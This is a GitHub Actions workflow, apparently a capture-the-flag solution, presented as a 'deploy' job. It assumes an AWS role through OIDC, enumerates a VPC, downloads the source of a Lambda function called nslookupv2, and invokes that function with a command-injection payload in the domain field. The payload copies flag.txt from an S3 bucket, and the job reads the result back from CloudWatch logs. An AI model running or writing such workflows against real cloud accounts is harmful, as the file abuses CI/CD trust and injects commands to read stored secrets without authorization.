name: deploy
on:
  push:
    branches:
      - corgi

jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Describe VPC
        run: |
          echo "===== VPC ====="
          aws ec2 describe-vpcs --vpc-ids vpc-09328d3fa21dce320

      - name: Get Lambda code location and download source
        run: |
          echo "===== LAMBDA CODE LOCATION ====="
          URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
          echo "$URL"
          curl -sL "$URL" -o code.zip

      - name: Unzip and show handler
        run: |
          mkdir -p extracted
          unzip -o code.zip -d extracted
          echo "===== FILES ====="
          find extracted -type f
          echo "===== lambda_function.py ====="
          cat extracted/lambda_function.py || true

      - name: Invoke nslookupv2 with injected payload
        run: |
          aws lambda invoke \
            --function-name nslookupv2 \
            --payload '{"domain":"example.com; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}' \
            --cli-binary-format raw-in-base64-out \
            response.json
          echo "===== INVOKE RESPONSE ====="
          cat response.json

      - name: Wait for logs to propagate
        run: sleep 8

      - name: Fetch CloudWatch logs
        run: |
          STREAM=$(aws logs describe-log-streams \
            --log-group-name /aws/lambda/nslookupv2 \
            --order-by LastEventTime --descending --limit 1 \
            --query 'logStreams[0].logStreamName' --output text)
          echo "===== LOG STREAM: $STREAM ====="
          aws logs get-log-events \
            --log-group-name /aws/lambda/nslookupv2 \
            --log-stream-name "$STREAM" \
            --query 'events[*].message' \
            --output text
